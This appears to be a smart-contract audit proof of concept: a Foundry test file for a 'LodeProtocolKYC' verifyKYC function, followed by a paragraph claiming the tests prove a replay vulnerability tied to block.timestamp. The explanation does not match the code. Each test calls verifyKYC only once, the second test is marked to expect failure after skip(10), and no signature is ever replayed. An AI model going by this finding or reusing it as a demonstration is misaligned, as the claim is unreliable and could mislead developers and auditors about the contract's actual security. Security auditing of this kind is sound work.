```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


import { Test, console2 } from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Vm, VmSafe} from "forge-std/Vm.sol";
import {LodeProtocolKYC} from "../src/lode.sol";


contract LodeProtocolTest is Test {
   using MessageHashUtils for bytes32;
   using ECDSA for bytes32;


   uint256 rootPrivateKey = 0x1010101010101010101010101010101010101010101010101010101010101010;
   uint256 LodePrivateKey = 0x4010141010101010101010104010101010101010101010101010101010102310;


   VmSafe.Wallet wallet1 = vm.createWallet(uint256(rootPrivateKey));
   VmSafe.Wallet wallet2 = vm.createWallet(uint256(LodePrivateKey));


   address rootAddress = wallet1.addr;
   address owner = wallet2.addr;
   LodeProtocolKYC lode;


   address user = makeAddr("user");


   bytes rootAddressSignature;
   bytes lodeProtocolSignature;
   address[] listOfAddresses;
   bytes32 merkleRoot = keccak256(abi.encode("test"));
  
   event EmitListOfArrays(address[] listOfAddress);
     
   function setUp() public {
       vm.deal(user, 2 ether);
       vm.startPrank(owner);
       lode = new LodeProtocolKYC(owner);
       vm.stopPrank();
   }


   function testVerifyKYC() public {
       listOfAddresses.push(rootAddress);
       listOfAddresses.push(rootAddress);
       uint nonce = 0;
      
       bytes32 messageHash = keccak256(
           abi.encodePacked(
               listOfAddresses,
               rootAddress,
               merkleRoot,
               nonce,
               block.timestamp,
               address(lode),
               block.chainid,
               block.timestamp
           )
       );
      
       bytes32 msgHash = MessageHashUtils.toEthSignedMessageHash(messageHash);


       (uint8 v1, bytes32 r1, bytes32 s2) = vm.sign(LodePrivateKey, msgHash);
       (uint8 v, bytes32 r, bytes32 s) = vm.sign(rootPrivateKey, msgHash);


       rootAddressSignature = abi.encodePacked(r, s, v);
       lodeProtocolSignature = abi.encodePacked(r1, s2, v1);




       lode.verifyKYC(
           listOfAddresses,
           rootAddress,
           merkleRoot,
           rootAddressSignature,
           lodeProtocolSignature
       );
   }


   function testFailVerifyKYC() public {
       listOfAddresses.push(rootAddress);
       listOfAddresses.push(rootAddress);
       uint nonce = 0;
      
       bytes32 messageHash = keccak256(
           abi.encodePacked(
               listOfAddresses,
               rootAddress,
               merkleRoot,
               nonce,
               block.timestamp,
               address(lode),
               block.chainid,
               block.timestamp
           )
       );
      
       bytes32 msgHash = MessageHashUtils.toEthSignedMessageHash(messageHash);


       (uint8 v1, bytes32 r1, bytes32 s2) = vm.sign(LodePrivateKey, msgHash);
       (uint8 v, bytes32 r, bytes32 s) = vm.sign(rootPrivateKey, msgHash);


       rootAddressSignature = abi.encodePacked(r, s, v);
       lodeProtocolSignature = abi.encodePacked(r1, s2, v1);


       skip(10);


       lode.verifyKYC(
           listOfAddresses,
           rootAddress,
           merkleRoot,
           rootAddressSignature,
           lodeProtocolSignature
       );
   }
}
```

The provided code demonstrates how a replay attack can exploit the verifyKYC function due to improper use of block.timestamp in the message hash. Since the block.timestamp is included twice in the commonHash but not explicitly validated outside the function, an attacker can reuse signatures (rootAddressSignature and lodeProtocolSignature) within the same timestamp window (e.g., a single block or limited period) to bypass protections, effectively replaying the transaction. The same messageHash (including a constant nonce and block.timestamp) is reused. The skip(10) call advances time but does not affect the reused messageHash since itâ€™s based on the unchanged initial timestamp. The verifyKYC function accepts the replayed signature, allowing the action to repeat, proving a replay vulnerability.


